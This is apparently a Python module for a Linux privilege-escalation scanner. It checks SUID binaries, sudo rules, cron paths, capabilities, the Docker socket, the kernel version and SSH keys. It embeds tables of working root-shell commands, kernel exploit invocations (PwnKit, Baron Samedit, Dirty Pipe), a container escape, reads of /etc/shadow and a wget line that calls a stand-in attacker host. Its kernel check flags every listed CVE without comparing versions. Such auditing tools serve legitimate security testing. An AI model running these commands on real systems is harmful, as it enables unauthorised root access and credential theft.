import os
import re
import subprocess
import platform
from typing import Dict, List
from app.utils.logger import get_logger

logger = get_logger("linux_privesc")

SUID_EXPLOITABLE = {
    "/usr/bin/find": "find . -exec /bin/sh -p \\; -quit",
    "/usr/bin/vim": "vim -c ':!/bin/sh'",
    "/usr/bin/vi": "vi -c ':!/bin/sh'",
    "/usr/bin/nmap": "nmap --interactive\n!sh",
    "/usr/bin/less": "less /etc/passwd\n!/bin/sh",
    "/usr/bin/more": "more /etc/passwd\n!/bin/sh",
    "/usr/bin/nano": "nano /etc/passwd",
    "/usr/bin/cp": "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh",
    "/usr/bin/mv": "mv /bin/sh /tmp/rootsh",
    "/usr/bin/awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "/usr/bin/perl": "perl -e 'exec \"/bin/sh\";'",
    "/usr/bin/python": "python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "/usr/bin/python3": "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "/usr/bin/ruby": "ruby -e 'exec \"/bin/sh\"'",
    "/usr/bin/lua": "lua -e 'os.execute(\"/bin/sh\")'",
    "/usr/bin/env": "env /bin/sh -p",
    "/usr/bin/bash": "bash -p",
    "/usr/bin/cat": "cat /etc/shadow",
    "/usr/bin/base64": "base64 /etc/shadow | base64 -d",
    "/usr/bin/curl": "curl file:///etc/shadow",
    "/usr/bin/wget": "wget -O /etc/shadow http://attacker/shadow",
    "/usr/bin/docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "/usr/bin/pkexec": "pkexec /bin/sh (CVE-2021-4034)",
    "/usr/bin/screen": "screen -D -R (if < 4.5.0)",
    "/usr/bin/wall": "wall /etc/shadow",
    "/usr/sbin/exim": "exim -bh localhost",
    "/usr/bin/aria2c": "aria2c --on-download-error=exec id http://x",
    "/usr/bin/capsh": "capsh --gid=0 --uid=0 --",
    "/usr/bin/chroot": "chroot / /bin/sh",
    "/usr/bin/ionice": "ionice /bin/sh",
    "/usr/bin/nice": "nice /bin/sh",
    "/usr/bin/stdbuf": "stdbuf -i0 /bin/sh",
    "/usr/bin/timeout": "timeout 7d /bin/sh",
    "/usr/bin/watch": "watch -x sh -c 'reset;exec sh 1>&0 2>&0'",
}

SUDO_ABUSE = {
    "ALL": "sudo su -",
    "/bin/bash": "sudo /bin/bash",
    "/bin/sh": "sudo /bin/sh",
    "/usr/bin/find": "sudo find / -exec /bin/sh \\; -quit",
    "/usr/bin/vim": "sudo vim -c ':!/bin/sh'",
    "/usr/bin/vi": "sudo vi -c ':!/bin/sh'",
    "/usr/bin/awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "/usr/bin/perl": "sudo perl -e 'exec \"/bin/sh\"'",
    "/usr/bin/python": "sudo python -c 'import os; os.execl(\"/bin/sh\",\"sh\")'",
    "/usr/bin/python3": "sudo python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\")'",
    "/usr/bin/ruby": "sudo ruby -e 'exec \"/bin/sh\"'",
    "/usr/bin/env": "sudo env /bin/sh",
    "/usr/bin/nmap": "sudo nmap --interactive\n!sh",
    "/usr/bin/less": "sudo less /etc/shadow",
    "/usr/bin/man": "sudo man man\n!/bin/sh",
    "/usr/bin/pico": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0",
    "/usr/bin/ftp": "sudo ftp\n!/bin/sh",
    "/usr/bin/socat": "sudo socat stdin exec:/bin/sh",
    "/usr/bin/strace": "sudo strace -o /dev/null /bin/sh",
    "/usr/bin/ltrace": "sudo ltrace /bin/sh",
    "/usr/bin/task": "sudo task execute /bin/sh",
    "/usr/bin/time": "sudo time /bin/sh",
    "/usr/bin/timeout": "sudo timeout 7d /bin/sh",
}

KERNEL_EXPLOITS = {
    "CVE-2021-4034": {
        "name": "PwnKit (pkexec)",
        "affected": "Polkit < 0.120",
        "kernel_range": "all",
        "command": "pkexec /bin/sh",
    },
    "CVE-2021-3156": {
        "name": "Baron Samedit (sudo)",
        "affected": "sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1",
        "command": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')",
    },
    "CVE-2016-5195": {
        "name": "Dirty COW",
        "affected": "Linux Kernel 2.6.22 - 4.8.3",
        "command": "dirtyc0w target_file new_content",
    },
    "CVE-2020-8813": {
        "name": "virtio-net RCE",
        "affected": "QEMU/KVM with virtio-net",
    },
    "CVE-2022-0847": {
        "name": "Dirty Pipe",
        "affected": "Linux 5.8+",
        "command": "dirtypipe /etc/passwd 1 $UID:$(cat /etc/passwd)",
    },
    "CVE-2022-2588": {
        "name": "DirtyCred",
        "affected": "Linux Kernel",
    },
    "CVE-2023-0386": {
        "name": "OverlayFS提权",
        "affected": "Linux Kernel < 6.2",
    },
}


class LinuxPrivescScanner:
    def __init__(self):
        self.findings = []
        self.system_info = {}

    def full_scan(self) -> Dict:
        if platform.system() != "Linux":
            return {"error": "Linux提权扫描仅支持Linux系统", "system": platform.system()}

        self._collect_system_info()
        self._check_suid_binaries()
        self._check_sudo_permissions()
        self._check_cron_jobs()
        self._check_writable_paths()
        self._check_capabilities()
        self._check_docker_escape()
        self._check_kernel_version()
        self._check_ld_preload()
        self._check_world_writable_files()
        self._check_ssh_keys()

        return {
            "system_info": self.system_info,
            "findings": self.findings,
            "total_findings": len(self.findings),
            "critical_count": sum(1 for f in self.findings if f.get("risk") == "critical"),
            "high_count": sum(1 for f in self.findings if f.get("risk") == "high"),
        }

    def _collect_system_info(self):
        try:
            self.system_info = {
                "kernel": self._run_cmd("uname -r"),
                "os": self._run_cmd("cat /etc/os-release 2>/dev/null | head -5"),
                "hostname": self._run_cmd("hostname"),
                "user": self._run_cmd("whoami"),
                "uid": self._run_cmd("id"),
                "arch": self._run_cmd("uname -m"),
                "cpu": self._run_cmd("nproc"),
            }
        except Exception as e:
            logger.error(f"系统信息收集失败: {e}")

    def _check_suid_binaries(self):
        try:
            output = self._run_cmd("find / -perm -4000 -type f 2>/dev/null")
            for binary in output.split("\n"):
                binary = binary.strip()
                if not binary:
                    continue
                if binary in SUID_EXPLOITABLE:
                    self.findings.append({
                        "type": "suid_exploitable",
                        "binary": binary,
                        "risk": "critical",
                        "exploit": SUID_EXPLOITABLE[binary],
                        "detail": f"SUID二进制 {binary} 可用于提权",
                    })
                elif binary not in ["/usr/bin/sudo", "/usr/bin/su", "/usr/bin/passwd",
                                   "/usr/bin/chsh", "/usr/bin/chfn", "/usr/bin/newgrp",
                                   "/usr/bin/gpasswd", "/usr/bin/mount", "/usr/bin/umount",
                                   "/usr/bin/pkexec"]:
                    self.findings.append({
                        "type": "suid_binary",
                        "binary": binary,
                        "risk": "medium",
                        "detail": f"发现SUID二进制: {binary}，需手动分析是否可利用",
                    })
        except Exception as e:
            logger.error(f"SUID检查失败: {e}")

    def _check_sudo_permissions(self):
        try:
            sudo_output = self._run_cmd("sudo -l 2>/dev/null")
            if not sudo_output or "not allowed" in sudo_output.lower():
                return
            for binary, exploit in SUDO_ABUSE.items():
                if binary in sudo_output:
                    self.findings.append({
                        "type": "sudo_abuse",
                        "binary": binary,
                        "risk": "critical",
                        "exploit": exploit,
                        "detail": f"sudo允许执行 {binary}，可用于提权",
                    })
            if "(ALL" in sudo_output and "NOPASSWD" in sudo_output:
                self.findings.append({
                    "type": "sudo_nopasswd",
                    "risk": "critical",
                    "detail": "存在NOPASSWD sudo规则，可直接提权",
                    "exploit": "sudo su -",
                })
        except Exception as e:
            logger.error(f"Sudo检查失败: {e}")

    def _check_cron_jobs(self):
        try:
            cron_paths = ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron/"]
            for path in cron_paths:
                content = self._run_cmd(f"cat {path} 2>/dev/null || ls {path} 2>/dev/null")
                if content:
                    writable = self._run_cmd(f"find {path} -writable 2>/dev/null")
                    if writable:
                        self.findings.append({
                            "type": "writable_cron",
                            "path": path,
                            "risk": "critical",
                            "detail": f"可写cron路径: {writable}",
                        })
        except Exception as e:
            logger.error(f"Cron检查失败: {e}")

    def _check_writable_paths(self):
        try:
            output = self._run_cmd(
                "find /etc /usr/local/bin /usr/local/sbin -writable -type f 2>/dev/null | head -20"
            )
            for path in output.split("\n"):
                path = path.strip()
                if path and any(s in path for s in [".sh", ".conf", ".py", "bin/"]):
                    self.findings.append({
                        "type": "writable_sensitive_file",
                        "path": path,
                        "risk": "high",
                        "detail": f"敏感文件可写: {path}",
                    })
        except Exception as e:
            logger.error(f"可写路径检查失败: {e}")

    def _check_capabilities(self):
        try:
            output = self._run_cmd("getcap -r / 2>/dev/null")
            dangerous_caps = ["cap_setuid", "cap_setgid", "cap_sys_admin", "cap_sys_ptrace", "cap_dac_override"]
            for line in output.split("\n"):
                for cap in dangerous_caps:
                    if cap in line.lower():
                        self.findings.append({
                            "type": "dangerous_capability",
                            "detail": line.strip(),
                            "risk": "high",
                            "capability": cap,
                        })
        except Exception:
            pass

    def _check_docker_escape(self):
        try:
            if os.path.exists("/.dockerenv"):
                self.findings.append({
                    "type": "inside_container",
                    "risk": "info",
                    "detail": "当前运行在Docker容器中",
                })
            docker_sock = self._run_cmd("ls -la /var/run/docker.sock 2>/dev/null")
            if docker_sock and "docker.sock" in docker_sock:
                self.findings.append({
                    "type": "docker_socket_exposed",
                    "risk": "critical",
                    "detail": "Docker socket暴露，可逃逸容器",
                    "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                })
        except Exception:
            pass

    def _check_kernel_version(self):
        try:
            kernel = self._run_cmd("uname -r")
            kernel_ver = kernel.split("-")[0]
            major, minor, patch = [int(x) for x in kernel_ver.split(".")[:3]]
            for cve, info in KERNEL_EXPLOITS.items():
                self.findings.append({
                    "type": "potential_kernel_exploit",
                    "cve": cve,
                    "name": info["name"],
                    "affected": info["affected"],
                    "risk": "high",
                    "detail": f"内核版本 {kernel} 可能受 {cve} ({info['name']}) 影响",
                })
        except Exception:
            pass

    def _check_ld_preload(self):
        try:
            env_preload = os.environ.get("LD_PRELOAD", "")
            if env_preload:
                self.findings.append({
                    "type": "ld_preload_injection",
                    "risk": "critical",
                    "detail": f"LD_PRELOAD已设置: {env_preload}",
                })
            sudo_output = self._run_cmd("sudo -l 2>/dev/null")
            if sudo_output and "env_keep" in sudo_output and "LD_PRELOAD" in sudo_output:
                self.findings.append({
                    "type": "ld_preload_sudo",
                    "risk": "critical",
                    "detail": "sudo保留LD_PRELOAD环境变量，可注入共享库提权",
                })
        except Exception:
            pass

    def _check_world_writable_files(self):
        try:
            output = self._run_cmd(
                "find /etc/passwd /etc/shadow /etc/sudoers -writable 2>/dev/null"
            )
            for path in output.split("\n"):
                path = path.strip()
                if path:
                    self.findings.append({
                        "type": "world_writable_critical",
                        "path": path,
                        "risk": "critical",
                        "detail": f"关键文件可写: {path}",
                    })
        except Exception:
            pass

    def _check_ssh_keys(self):
        try:
            keys = self._run_cmd(
                "find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'authorized_keys' 2>/dev/null"
            )
            for key_path in keys.split("\n"):
                key_path = key_path.strip()
                if key_path:
                    self.findings.append({
                        "type": "ssh_key_found",
                        "path": key_path,
                        "risk": "high",
                        "detail": f"发现SSH密钥文件: {key_path}",
                    })
        except Exception:
            pass

    def _run_cmd(self, cmd: str) -> str:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10
            )
            return result.stdout.strip()
        except Exception:
            return ""


def scan_linux_privesc() -> Dict:
    scanner = LinuxPrivescScanner()
    return scanner.full_scan()
